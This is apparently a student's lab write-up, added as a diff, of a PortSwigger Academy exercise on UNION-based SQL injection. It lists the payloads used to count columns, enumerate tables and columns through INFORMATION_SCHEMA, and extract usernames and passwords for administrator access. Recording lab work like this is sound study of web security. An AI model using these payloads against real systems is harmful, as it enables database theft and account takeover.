@@ -1,0 +1,80 @@
+PortSwigger Academy Lab: SQL injection attack, listing the database contents on non-Oracle databases
+
+*****Check for SQL injection*****
+⦁	Input: '
+⦁	Output: Internal Error.
+⦁	Lesson Learned: SQL injection vulnerability exists.
+
+*****Determine the number of columns*****
+ATTEMPT-1
+⦁	Input: ORDER BY 1 --
+⦁	Output: No Error.
+
+ATTEMPT-2
+⦁	Input: ORDER BY 2 --
+⦁	Output: No Error.
+
+ATTEMPT-3
+⦁	Input: ORDER BY 3 --
+⦁	Output: Internal Error.
+
+Lesson Learned: Application expects two columns for input
+
+*****Finding columns with a useful datatype*****
+
+ATTEMPT-1
+⦁	Input: UNION SELECT NULL, NULL --
+⦁	Output: No Error.
+
+ATTEMPT-2
+⦁	Input: UNION SELECT 'A', NULL --
+⦁	Output: A is reflected in the output.
+
+ATTEMPT-3
+⦁	Input: UNION SELECT 'A','A' --
+⦁	Output: Two A's are reflected in the output.
+
+Lesson Learned: Two columns expect string/text input.
+
+*****Retrieving list of tables in the database*****
+
+ATTEMPT-1
+⦁	Input: UNION SELECT TABLE_NAME,TABLE_TYPE
+       FROM INFORMATION_SCHEMA.TABLES --
+⦁	Output: List of Tables, Views.
+
+ATTEMPT-2(FILTERING OUTPUT FOR ONLY BASE TABLES)
+⦁	Input: UNION SELECT TABLE_NAME,TABLE_SCHEMA
+       FROM INFORMATION_SCHEMA.TABLES
+       WHERE TABLE_TYPE = 'BASE TABLES' --
+⦁	Output: List of Base Tables and their Schemas.
+
+Lesson Learned: There are multiple types of schemas in a database.
+
+Schemas
+⦁	table_schema
+⦁	pg_catalog
+⦁	information_schema
+⦁	public
+
+*****Finding out the TABLE_NAME and COLUMN_NAME in public schema*****
+
+ATTEMPT-1
+⦁	Input: UNION SELECT TABLE_NAME, COLUMN_NAME
+           FROM INFORMATION_SCHEMA.COLUMNS
+           WHERE TABLE_SCHEMA='public' --
+
+⦁	Output: List of tables and their column names
+
+Lesson Learned: A table named users_igotzn contains two interesting columns, 
+                called username_rcgxzz, password_yqeqrh among other columns.
+
+*****Exploiting the vulnerability*****
+
+ATTEMPT-1
+⦁	Input: UNION SELECT username_rcgxzz, password_yqeqrh
+           FROM users_igotzn --
+⦁	Output: List of all usernames and password.
+
+Lesson Learned: Retrieved administrator credentials(username, password)
+                and accessed the website with escalated privileges.
